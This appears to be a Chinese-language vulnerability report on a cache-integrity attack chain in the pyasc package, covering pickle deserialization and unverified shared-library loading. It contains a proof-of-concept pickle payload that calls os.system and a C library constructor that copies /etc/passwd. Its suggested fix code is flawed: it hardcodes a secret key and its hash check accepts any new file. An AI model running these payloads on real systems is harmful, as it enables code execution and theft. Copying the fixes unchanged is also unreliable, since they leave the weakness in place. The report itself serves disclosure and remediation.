# VULN-CROSS-004：跨模块缓存完整性攻击链漏洞

## 漏洞概述

**漏洞类型**: 缓存完整性漏洞  
**CWE**: CWE-502 (Deserialization of Untrusted Data)  
**严重程度**: Critical  
**置信度**: 85%

### 影响范围

跨模块缓存完整性链涉及多个模块：
- **runtime/jit.py**: pickle 反序列化缓存文件
- **runtime/cache.py**: 缓存目录由环境变量控制
- **lib_runtime/state.py**: ctypes.CDLL 加载 .so 文件

### 漏洞描述

跨模块缓存完整性链: pickle 反序列化缓存文件和 ctypes.CDLL 加载 .so 文件均无完整性验证。若缓存目录被篡改 (通过环境变量或文件权限问题)，可注入恶意 payload。

---

## 完整攻击链分析

### 攻击链 1: Pickle 缓存污染

```
[缓存目录控制]
PYASC_CACHE_DIR=/tmp/attacker_cache
    ↓
[缓存目录结构]
~/.pyasc/cache/<hash>/kernel.o
~/.pyasc/cache/<hash>/librt_wrapper.so
~/.pyasc/cache/<hash>/libnpu_utils.so
    ↓
[攻击者放置恶意文件]
kernel.o: 恶意 pickle payload
librt_wrapper.so: 恶意共享库
    ↓
[触发加载]
jit.py:171-172 → pickle.load(kernel.o)
state.py:50 → ctypes.CDLL(librt_wrapper.so)
    ↓
[恶意 payload 执行]
```

### 攻击链 2: 共享库劫持

```
[缓存污染]
攻击者修改 librt_wrapper.so
    ↓
[RuntimeInterface 初始化]
state.py:37 → cache_manager.get_file()
    ↓
[加载污染的库]
state.py:50 → ctypes.CDLL(rt_lib)
    ↓
[constructor 函数执行]
恶意库的 __attribute__((constructor)) 自动执行
    ↓
[任意代码执行]
```

---

## PoC 构造思路

### 综合攻击示例

```bash
# 1. 设置恶意缓存目录
export PYASC_CACHE_DIR=/tmp/malicious_cache

# 2. 创建恶意 pickle payload
python3 << 'EOF'
import pickle
import os

class MaliciousKernel:
    def __reduce__(self):
        return (os.system, ('whoami > /tmp/pwned',))

payload = pickle.dumps(MaliciousKernel())
EOF

# 3. 创建恶意共享库
cat > malicious_rt.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void attack() {
    system("cat /etc/passwd > /tmp/stolen");
}
EOF
gcc -shared -fPIC -o malicious_rt.so malicious_rt.c

# 4. 放置恶意文件到正确位置
# 需要计算缓存 key 并创建对应目录结构
mkdir -p /tmp/malicious_cache/<cache_key_hash>
cp payload /tmp/malicious_cache/<cache_key_hash>/kernel.o
cp malicious_rt.so /tmp/malicious_cache/<cache_key_hash>/librt_wrapper.cpython-39-x86_64-linux-gnu.so

# 5. 运行 pyasc，触发缓存加载
python3 -c "import asc; ..."
# 结果: pickle 和 共享库中的恶意代码都会执行
```

---

## 利用条件分析

| 条件 | 要求 | 说明 |
|------|------|------|
| 攻击者位置 | 本地 | 设置环境变量或写入文件 |
| 权限要求 | 用户级 | 环境变量设置不需要特殊权限 |
| key 计算 | 需要 | 需要计算正确的缓存 key |
| 用户交互 | 无 | pyasc 初始化自动触发 |

---

## 影响分析

### 安全影响

1. **双重攻击向量**: pickle 反序列化 + 动态库加载
2. **任意代码执行**: 两种方式都可以执行恶意代码
3. **隐蔽性**: 恶意代码隐藏在缓存文件中

---

## 修复建议

### 优先级 1: 缓存完整性验证系统

```python
import hashlib
import hmac
import json

class SecureCacheManager:
    SECRET_KEY = b"pyasc_cache_secret_key"  # 从安全配置读取
    
    def compute_signature(self, data: bytes) -> str:
        return hmac.new(self.SECRET_KEY, data, hashlib.sha256).hexdigest()
    
    def put(self, data: bytes, filename: str) -> str:
        signature = self.compute_signature(data)
        signed_data = data + signature.encode()
        
        # 存储签名的数据
        filepath = super().put(signed_data, filename)
        
        # 同时存储 metadata
        metadata = {
            'signature': signature,
            'hash': hashlib.sha256(data).hexdigest(),
            'timestamp': time.time()
        }
        super().put(json.dumps(metadata).encode(), filename + '.meta')
        
        return filepath
    
    def get_file(self, filename: str) -> Optional[str]:
        filepath = super().get_file(filename)
        if filepath is None:
            return None
        
        # 验证签名
        with open(filepath, 'rb') as f:
            signed_data = f.read()
        
        data = signed_data[:-64]
        signature = signed_data[-64:].decode()
        
        expected_sig = self.compute_signature(data)
        if signature != expected_sig:
            raise RuntimeError(f"Cache integrity check failed for {filename}")
        
        return filepath
```

### 优先级 2: 禁止环境变量控制缓存目录

```python
# 强制使用固定缓存目录
SECURE_CACHE_DIR = os.path.expanduser("~/.pyasc/cache")

def get_cache_manager(key: str):
    env_cache = os.getenv('PYASC_CACHE_DIR')
    if env_cache and env_cache != SECURE_CACHE_DIR:
        raise RuntimeError(f"PYASC_CACHE_DIR must be {SECURE_CACHE_DIR} for security")
    
    return SecureCacheManager(key, SECURE_CACHE_DIR)
```

### 优先级 3: 加载前 hash 验证

```python
EXPECTED_CACHE_HASHES = {
    'rt_wrapper': 'sha256:<expected_hash>',
    'npu_utils': 'sha256:<expected_hash>',
}

def verify_cache_hash(filename: str, filepath: str) -> bool:
    expected = EXPECTED_CACHE_HASHES.get(filename)
    if not expected:
        # 新文件，生成 hash 并记录
        with open(filepath, 'rb') as f:
            actual_hash = hashlib.sha256(f.read()).hexdigest()
        # 存储到安全配置
        return True
    
    with open(filepath, 'rb') as f:
        actual_hash = hashlib.sha256(f.read()).hexdigest()
    
    return actual_hash == expected.split(':')[1]
```

---

## 相关漏洞

- **VULN-SEC-RUN-001**: Pickle 反序列化漏洞
- **VULN-SEC-RT-001**: 动态库加载漏洞
- **VULN-lib_runtime-001/002/003/006**: 缓存污染漏洞
- **VULN-CROSS-001**: 环境变量攻击链